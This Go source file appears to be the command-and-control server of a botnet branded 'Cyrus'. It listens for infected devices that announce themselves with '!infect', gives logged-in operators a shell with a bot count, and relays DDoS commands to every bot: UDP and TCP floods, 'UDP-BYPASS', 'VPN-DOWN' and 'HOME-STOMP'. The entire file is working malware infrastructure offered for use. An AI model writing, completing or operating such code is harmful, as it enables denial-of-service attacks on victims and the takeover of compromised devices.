package main

import (
	http_serv "botnet/server/handle"
	"botnet/server/utils"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"syscall"
	"time"
)

const (
	SERVER_IP      = "0.0.0.0"
	CNC_PORT       = "9999"
	FAKE_CONC_PORT = "9955"

	PREFIX = '!'
)

var bots_connected []net.Conn
var users_connected = map[net.Conn]bool{}

func main() {
	go http_serv.ServFiles()
	server, err := net.Listen("tcp", SERVER_IP+":"+CNC_PORT)

	if err != nil {
		fmt.Println("Failed loading TCP server: ", err.Error())
	}
	go update_bots()
	defer server.Close()

	fmt.Println("Started server, waiting for bots.")
	for {
		connection, err := server.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		fmt.Println("\n[+] Got connection")

		msg := get_msg(connection)
		if len(msg) == 0 {
			connection.Close()
			fmt.Println("tcp disconnection flag invoked")
		}
		if len(msg) > 0 && msg[0] == PREFIX {
			cmd := trim(msg)
			args := []string{}

			argc := len(strings.Split(msg, " "))
			for i := 1; i < argc; i++ {
				args = append(args, strings.Split(msg, " ")[i])
			}

			if !strings.Contains(cmd, "infect") {
				/*
					fmt.Println("\nDisplaying args being sent to bots")
					for x := range args {
						fmt.Println(args[x])
					}
				*/
				run_command(connection, strings.Split(cmd, " ")[0], args)
			}

		} else {
			if utils.CmpSocketMessage(msg, "login") {
				time.Sleep(time.Millisecond * 500)
				connection.Write([]byte("username: "))
				time.Sleep(time.Millisecond * 500)
				username := remove_last_char(get_msg(connection))
				time.Sleep(time.Millisecond * 500)
				connection.Write([]byte("password: "))
				password := remove_last_char(get_msg(connection))
				fmt.Println(len(username))
				if utils.Valid_User_Combo(username[0:len(username)-1], password[0:len(password)-1]) {
					write_logo(connection)
					users_connected[connection] = true
					connection.Write([]byte("\033[1;31mroot\033[37m@\033[1;31mcyrus:\033[0m "))
					fmt.Printf("%s has connected to the botnet. ", username[0:len(username)-1])
					go user_listener(connection)
				} else {
					connection.Write([]byte("Invalid credentials."))
					connection.Close()
				}
			}
		}
	}
}

func user_listener(connection net.Conn) {
	for {
		cmd := get_msg(connection)
		if len(cmd) == 0 {
			users_connected[connection] = false
			return
		}
		switch cmd[0 : len(cmd)-2] {
		case "botcount":
			connection.Write([]byte(fmt.Sprintf("\033[1;31m[\033[1;37mDEVICES INFECTED\033[1;31m]\033[1;37m: %d\r\n", len(bots_connected))))
			break
		case "help":
			connection.Write([]byte("\r\n\033[1;31m[\033[1;37mHELP\033[1;31m]\033[1;37m ~ Displays this message\r\n\033[1;31m[\033[1;37mSCAN\033[1;31m]\033[1;37m ~ Scan an IP for open ports\r\n\033[1;31m[\033[1;37mBOTCOUNT\033[1;31m]\033[1;37m ~ Outputs devices infected\r\n\033[1;31m[\033[1;37mMETHODS\033[1;31m]\033[1;37m ~ Displays attack methods\r\n\r\n"))
			break
		case "menu":
			write_logo(connection)
			break
		case "methods":
			connection.Write([]byte("\r\n\r\n\033[1;31m[\033[1;37mMETHODS\033[1;31m]:		\r\n\r\n\033[1;37m !* UDP [IP] [PORT] 1024 [TIME]\r\n !* TCP [IP] [PORT] 1024 [OSI] [THREADS] [TIME]\r\n !* HOME-FREEZE [IP] [PORT] 1024 [TIME] [THREADS]\r\n !* VPN-DOWN [THREADS] [IP] [PORT] 1024 [TIME]\r\n !* TCP-HTTP [IP] [PORT] [TIME]\r\n !* UDP-BYPASS [RPC] [THREADS] [IP] [PORT] 1024 [TIME]\r\n !* HOME-STOMP [IP] [PORT] [PSIZE] [TIME] [THREADS] [RPC]\r\n !* STOP [IP]\r\n\r\n"))
			break
		default:
			command_unrecognized := true
			spl := strings.Split(cmd[0:len(cmd)-2], " ")
			args := []string{utils.ATTACK_KEY}

			for v := range utils.VALID_METHODS {
				if utils.VALID_METHODS[v] == strings.ToUpper(spl[0]) {
					command_unrecognized = false
					switch strings.ToLower(utils.VALID_METHODS[v]) {
					case "tcp-http":
						fmt.Println("tcp support ig")
						break
					default:
						for x := 1; x < len(spl); x++ {
							args = append(args, spl[x])
						}
						break
					}
					args = append(args, spl[0])
					fmt.Println("Listing argsd")
					for y := range args {
						fmt.Println(fmt.Sprintf("[%d] = %s", y, args[y]))
					}
					run_command(connection, "attack", args)
					connection.Write([]byte("\r\n"))
					break
				}
			}
			if command_unrecognized {
				fmt.Println("Unrecognized command.")
			}
			break
		}
		write_holder(connection)
	}
}

func write_holder(connection net.Conn) {
	connection.Write([]byte("\033[1;31mroot\033[37m@\033[1;31mcyrus:\033[0m "))
}
func already_infected(ip string) bool {
	for _, v := range bots_connected {
		if strings.Split(v.RemoteAddr().String(), ":")[0] == ip {
			return true
		}
	}
	return false
}

func write_logo(connection net.Conn) {
	indent := "		               "
	connection.Write([]byte("\033c"))
	connection.Write([]byte(fmt.Sprint("\033[1;33m")))
	connection.Write([]byte(fmt.Sprintf("%s┌─┐┬ ┬┬─┐┬ ┬┌─┐\r\n", indent)))
	connection.Write([]byte(fmt.Sprintf("%s│  └┬┘├┬┘│ │└─┐\r\n", indent)))
	connection.Write([]byte(fmt.Sprintf("%s└─┘ ┴ ┴└─└─┘└─┘\r\n\r\n\r\n	    	         Welcome to the \033[4;36m𝑪𝒀𝑹𝑼𝑺\033[0m\033[1;33m Botnet.\033[1;33m\r\n	    	    You are \033[4;31mNOT\033[0m\033[1;33m limited to concurrent attacks.\r\n	    	         Type \033[4;31mhelp\033[0m\033[1;33m to view commands.\r\n\r\n", indent)))
}
func connCheck(conn net.Conn) error {
	var sysErr error = nil
	rc, err := conn.(syscall.Conn).SyscallConn()
	if err != nil {
		return err
	}
	err = rc.Read(func(fd uintptr) bool {
		var buf []byte = []byte{0}
		n, _, err := syscall.Recvfrom(int(fd), buf, syscall.MSG_PEEK|syscall.MSG_DONTWAIT)
		switch {
		case n == 0 && err == nil:
			sysErr = io.EOF
		case err == syscall.EAGAIN || err == syscall.EWOULDBLOCK:
			sysErr = nil
		default:
			sysErr = err
		}
		return true
	})
	if err != nil {
		return err
	}
	return sysErr
}
func remove(s []net.Conn, i int) []net.Conn {
	s[i] = s[len(s)-1]
	return s[:len(s)-1]
}

func trim(str string) string {
	for i := range str {
		if i != 0 {
			return str[i:]
		}
	}
	return "Failed to trim"
}
func close_and_write(conn net.Conn, message string) {
	conn.Write([]byte(message))
	if !users_connected[conn] == true {
		conn.Close()
	}
}

func remove_last_char(str string) string {
	return str[0 : len(str)-1]
}
func get_msg(connection net.Conn) string {
	buffer := make([]byte, 1024)
	msg, err := connection.Read(buffer)
	fmt.Println(users_connected[connection])
	if err != nil {
		fmt.Println("[-----] READ FAILURE")
		if users_connected[connection] == true {
			if connCheck(connection) == io.EOF {
				fmt.Println("deleting")
				delete(users_connected, connection)
				connection.Close()
			}
		}
	}

	s := string(buffer[:msg])
	fmt.Println(s)
	if s == fmt.Sprintf("%cinfect", PREFIX) && !already_infected(strings.Split(connection.RemoteAddr().String(), ":")[0]) {
		bots_connected = append(bots_connected, connection)
		fmt.Printf("[INFECTED] %s", strings.Split(connection.RemoteAddr().String(), ":")[0])
	} else {
		if s == fmt.Sprintf("%cinfect", PREFIX) {
			fmt.Printf("%s Attempted to connect to botnet while already added. ", strings.Split(connection.RemoteAddr().String(), ":")[0])
		}
	}
	return s
}

func run_command(connection net.Conn, command string, argv []string) {

	var payload string
	var func_args []string

	switch strings.ToLower(command) {
	case "attack":
		key := argv[0]
		method := strings.ToLower(argv[len(argv)-1])

		fmt.Println("METHOD = " + method)
		switch method {
		case "udp": // IP, PORT, PSIZE, TIME
			fmt.Println("Test " + argv[1])
			if len(argv) != 6 {
				close_and_write(connection, fmt.Sprintf("udp expects 6 args got %d", len(argv)))
				return
			}
			ip := argv[1]
			port := argv[2]
			psize := argv[3]
			time := argv[4]

			func_args = append([]string{}, method, ip, port, psize, time)
			payload = fmt.Sprintf("%cATTACK %s %s %s %s %s", PREFIX, ip, port, psize, time, "udp-flood")
			fmt.Println("Built udp payload")
			break
		case "tcp-http": // -ip IP -port PORT -time TIME -protocol Udp/tcp -osilayer 4/7 -threads 200
			if len(argv) != 6 {
				close_and_write(connection, "tcp-http expects 6 args")
				return
			}
			ip := argv[1]
			port := argv[2]
			time := argv[3]
			func_args = append([]string{}, method, ip, port, time, "TCP")
			payload = fmt.Sprintf("%cATTACK %s %s %s TCP 7 200 TCP-HTTP", PREFIX, ip, port, time)
			fmt.Println("breaking")
			break
		case "udp-bypass": // rpc threads ip port psize time

			if len(argv) != 8 {
				close_and_write(connection, "UDP-BYPASS expects 8 args")
				return
			}
			func_args = append(func_args, method, argv[1], argv[2], argv[3], argv[4], argv[5], argv[6])
			payload = fmt.Sprintf("%cATTACK %s %s %s %s %s %s UDP-BYPASS", PREFIX, argv[1], argv[2], argv[3], argv[4], argv[5], argv[6])
			break
		case "vpn-down":
			if len(argv) != 7 {
				fmt.Println(len(argv))
				close_and_write(connection, "VPN-DOWN expects 7 args")
				return
			}
			func_args = append(func_args, method, argv[1], argv[2], argv[3], argv[4], argv[5])
			payload = fmt.Sprintf("%cATTACK %s %s %s %s %s VPN-DOWN", PREFIX, argv[1], argv[2], argv[3], argv[4], argv[5])
			break
		case "home-stomp":
			if len(argv) != 8 {
				fmt.Println(len(argv))
				close_and_write(connection, "HOME-STOMP expects 7 args")
				return
			}
			func_args = append(func_args, method, argv[1], argv[2], argv[3], argv[4], argv[5], argv[6])
			payload = fmt.Sprintf("%cATTACK %s %s %s %s %s %s HOME-STOMP", PREFIX, argv[1], argv[2], argv[3], argv[4], argv[5], argv[6])
			break
		case "stop":
			if len(argv) != 3 {
				fmt.Println(len(argv))
				close_and_write(connection, "STOP expects 3 args")
				return
			}
			func_args = append(func_args, method, argv[1])
			payload = fmt.Sprintf("%cATTACK %s STOP", PREFIX, argv[1])
			break
		default:
			fmt.Printf("invalid method sent %s\n", method)
			connection.Write([]byte("Invalid method."))
			break
		}
		fmt.Println(string(payload))
		for v := range func_args {
			fmt.Println(func_args[v])
		}
		fmt.Println(string(payload))
		if utils.Check_params(connection, key, func_args) {
			sent := 0
			for i, x := range bots_connected {
				_, err := x.Write([]byte(payload))
				addr := strings.Split(x.RemoteAddr().String(), ":")[0]
				if err != nil {
					if errors.Is(err, syscall.EPIPE) {
						fmt.Println(addr + " Socket closed, removing from array.\n")
						bots_connected = remove(bots_connected, i)
					} else {
						fmt.Println("[-] Failed sending command to " + addr)
					}
				} else {
					sent++
					fmt.Println("[+] Sent command to ", strings.Split(x.RemoteAddr().String(), ":")[0])
				}
			}
			fmt.Printf("[+] Sent command to %d bots\n", sent)
			connection.Write([]byte(fmt.Sprintf("Sent commands to %d bots", sent)))
			fmt.Println("\nSent command to bots.")
		} else {
			connection.Write([]byte("Invalid paramaters"))
		}
	case "bot_count":
		count := fmt.Sprint(len(bots_connected))
		connection.Write([]byte(count))
		break

	default:
		fmt.Printf("[-] Message started with prefix but wasnt a valid command ? ( %s )", command)
		fmt.Println(len(command))
		break
	}
	if !users_connected[connection] {
		connection.Close()
	}
}

func update_bots() {
	for i, v := range bots_connected {
		if connCheck(v) == io.EOF {
			fmt.Println(v.RemoteAddr())
			fmt.Printf("\n%s Disconnected ", strings.Split(v.RemoteAddr().String(), ":")[0])
			bots_connected = remove(bots_connected, i)
		}
	}
	time.Sleep(time.Millisecond * 25)
	update_bots()
}
